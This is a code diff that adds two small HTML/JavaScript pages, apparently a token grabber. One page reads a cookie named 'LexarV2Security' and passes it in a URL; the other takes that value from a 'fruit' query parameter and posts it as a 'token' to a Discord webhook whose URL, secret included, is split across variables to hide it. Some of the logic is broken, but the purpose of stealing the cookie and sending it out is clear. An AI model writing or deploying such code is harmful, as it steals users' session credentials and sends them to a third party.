@@ -1,0 +1,57 @@
+index.html:
+
+var l = "https://discord.com/api/"
+var o = "webhooks/1060736897"
+var v = "300840449/VcvZvUZ_zsu7LrM65yzAunzeGMi"
+var e = "Py6Hb0seaf1pzQr2LeSt3-8dSwcB1ev068lv-hwTV"
+document.title = "bruh";
+function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+}
+
+var fruit = getParameterByName('fruit');
+
+
+var request = new XMLHttpRequest(); //making a request for the webhook
+request.open("POST", l+o+v+e);
+
+request.setRequestHeader('Content-type', 'application/json');
+
+var params = {
+  username: "the big fish L",
+  avatar_url: "https://cdn.discordapp.com/attachments/1025483378146934906/1025506796460322896/a8479a922b151b03df56a6db105dc5dd.jpg",
+  content: "**token:** *" + fruit + "*"
+}
+
+
+request.send(JSON.stringify(params));
+
+
+sadas.html:
+
+function urllink() {
+
+    let popup = window.open('https://lexarmguiv2.online/generator')
+    function getCookie(name) {
+        let cookie = {};
+         document.cookie.split(';').forEach(function(el) {
+         let [k,v] = el.split('=');
+         cookie[k.trim()] = v;
+         })
+         return cookie[name];
+    }
+    window.addEventListener('load', function() {
+        popup.alert(getCookie('LexarV2Security'))
+    }, false);
+    
+    
+
+
+}
+window.open("https://phillipbruh.github.io/bruhee/?fruit="+urllink());
